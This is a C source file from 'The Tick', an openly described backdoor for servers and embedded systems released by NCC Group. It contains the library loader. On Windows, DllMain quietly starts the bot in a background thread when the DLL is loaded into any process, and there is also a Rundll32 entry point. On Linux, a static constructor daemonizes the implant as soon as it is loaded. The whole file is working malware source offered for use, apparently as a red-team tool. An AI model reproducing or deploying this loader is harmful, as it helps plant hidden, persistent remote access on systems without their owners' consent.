/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "libmain.h"

#include "command.h"

#ifdef _WIN32

DWORD WINAPI _stub_run(LPVOID lpParam);

// Windows version. Here we have a standard way of being called when we're loaded.
// However the state of the process may be quite unstable, depending on how
// the DLL was loaded. To be on the safe side, we create a background thread.
// The thread will be automatically locked until DLL initialization is complete.
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved __attribute__((unused)))
{
    // Only try to run the bot on DLL load, ignore all other events.
    if (fdwReason == DLL_PROCESS_ATTACH) {

        // Disable thread creation events, since it may cause a deadlock.
        DisableThreadLibraryCalls(hinstDLL);

        // Check if we're running inside rundll32.exe.
        char pathname[MAX_PATH];
        memset(pathname, 0, sizeof(pathname));
        GetModuleFileNameA(NULL, pathname, sizeof(pathname));
        char *filename = PathFindFileNameA(pathname);
        if (filename == NULL || filename[0] == 0 || stricmp(filename, "rundll32.exe") != 0) {

            // For any process other than rundll32.exe, run the bot in a background thread.
            // Do not wait for the thread to be initialized and just close the handle
            // immediately, otherwise we might deadlock since we're still being loaded.
            CloseHandle( CreateThread(NULL, 0, &_stub_run, NULL, 0, NULL) );

        }
    }

    // We must always return TRUE or the DLL load may be aborted.
    return TRUE;
}

// Function stub with the signature CreateThread expects.
DWORD WINAPI _stub_run(LPVOID lpParam __attribute__((unused)))
{
    run(0, NULL);
    ExitThread(0);
}

// Entrypoint function for use with Rundll32.
#if TICK_RUNDLL_ENTRY_POINT
extern void CALLBACK TICK_RUNDLL_ENTRY_POINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    run(0, NULL);
    ExitProcess(0);
}
#endif

#else

// This gets called by the ELF loader since it
// registers itself as a static C++ constructor.
static void static_constructor(void)
{
    daemonize(0, NULL);
    return;
}

#endif
